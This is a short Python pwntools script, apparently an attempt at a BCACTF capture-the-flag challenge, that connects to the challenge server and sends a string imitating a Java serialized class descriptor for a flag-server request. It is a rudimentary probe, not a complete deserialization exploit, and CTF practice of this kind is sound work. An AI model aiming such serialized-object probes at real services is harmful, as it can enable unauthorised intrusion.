from pwn import *


def send_serialized_data(host, port, serialized_data):
    try:
        # Create a remote connection
        conn = remote(host, port)
        
        # Send the serialized data
        conn.sendline(serialized_data)
        
        # Receive the response
        response = conn.recv(4096)  # Adjust buffer size as needed
        print(f"Received response (raw bytes): {response}")
        
    except Exception as e:
        print(f"An error occurred: {e}")
    finally:
        # Close the connection
        conn.close()

if __name__ == "__main__":
    host = "challs.bcactf.com"
    port = 30134
    
    # Serialized data string to send
    serialized_data = (
        "flagserver.MessageCtoS_Request chall Ljava/lang/String;"
    )
    
    # Send the serialized data to the server
    send_serialized_data(host, port, serialized_data)
